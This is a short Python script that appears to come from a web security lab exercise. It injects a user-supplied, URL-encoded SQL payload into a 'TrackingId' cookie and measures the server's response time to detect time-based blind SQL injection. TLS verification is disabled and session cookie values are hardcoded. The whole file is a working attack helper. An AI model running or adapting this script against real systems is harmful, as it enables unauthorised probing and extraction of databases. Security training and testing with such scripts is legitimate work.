import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check_timeDelays(url):
    print("Enter character to check:")
    check = input()
    sql_payload_encoded = urllib.parse.quote(check)
    cookies = {'TrackingId': 'ZJtlZNco4t8EFT6Q' + sql_payload_encoded, 
                'session': 'm2AssDJsVrPtOfB2ez5Vf1WVeABTrxvy'}
    r = requests.get(url, cookies=cookies, verify=False)
    print("response time ",int(r.elapsed.total_seconds()))

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    check_timeDelays(url) 

if __name__ == "__main__":
    main()